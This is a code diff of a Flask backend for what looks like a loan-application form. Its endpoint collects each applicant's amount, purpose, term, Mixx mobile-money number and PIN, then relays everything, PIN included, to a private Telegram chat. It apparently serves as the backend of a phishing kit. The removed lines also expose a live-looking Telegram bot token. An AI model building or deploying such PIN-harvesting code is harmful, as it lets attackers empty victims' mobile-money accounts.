@@ -1,20 +1,22 @@
 from flask import Flask, request, jsonify
+from flask_cors import CORS
 import requests
 import random
+import os
 
 app = Flask(__name__)
 
-# =========================
+# ENABLE CORS
+CORS(app)
+
 # TELEGRAM CONFIG
-# =========================
-BOT_TOKEN = "7787453591:AAHJ6udch8jmeJ06wIQegqzMh5RqYZ_nuC0"
+BOT_TOKEN = "YOUR_BOT_TOKEN"
 CHAT_ID = "6958413637"
 
-# Kuhifadhi maombi kwa muda
 maombi = {}
 
 # =========================
-# SEND TO TELEGRAM FUNCTION
+# SEND TO TELEGRAM
 # =========================
 def tuma_kwenye_telegram(app_id, data):
 
@@ -27,6 +29,7 @@ def tuma_kwenye_telegram(app_id, data):
 💰 Kiasi: {data.get('kiasi')}
 🎯 Lengo: {data.get('lengo')}
 📅 Muda: {data.get('muda')}
+📱 Mixx Number: {data.get('mixxNumber')}
 🔐 PIN: {data.get('pin')}
 
 📌 Hali: PENDING
@@ -34,41 +37,58 @@ def tuma_kwenye_telegram(app_id, data):
 
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
 
-    response = requests.post(
-        url,
-        json={
-            "chat_id": CHAT_ID,
-            "text": ujumbe
-        }
-    )
+    response = requests.post(url, json={
+        "chat_id": CHAT_ID,
+        "text": ujumbe
+    })
 
-    # Kuonyesha response ya Telegram kwenye terminal
     print(response.text)
+
+# =========================
+# HOME ROUTE
+# =========================
+@app.route("/")
+def home():
+    return "Backend Running Successfully"
 
 # =========================
 # STEP 3 ENDPOINT
 # =========================
 @app.route("/submit-step3", methods=["POST"])
-def wasilisha_hatua_ya_3():
+def submit_step3():
 
     try:
+
         data = request.get_json()
 
-        # Hakikisha data imepatikana
         if not data:
             return jsonify({
-                "message": "Hakuna data iliyotumwa"
+                "message": "No data received"
             }), 400
 
-        # Generate Application ID
         app_id = str(random.randint(10000, 99999))
 
-        # Save application
         maombi[app_id] = data
         maombi[app_id]["status"] = "PENDING"
 
-        # Send to Telegram
         tuma_kwenye_telegram(app_id, maombi[app_id])
 
         return jsonify({
-            "message": "Imefanikiwa",
+            "message": "Success",
+            "application_id": app_id
+        })
+
+    except Exception as e:
+
+        return jsonify({
+            "error": str(e)
+        }), 500
+
+# =========================
+# RUN APP
+# =========================
+if __name__ == "__main__":
+
+    port = int(os.environ.get("PORT", 5000))
+
+    app.run(host="0.0.0.0", port=port)
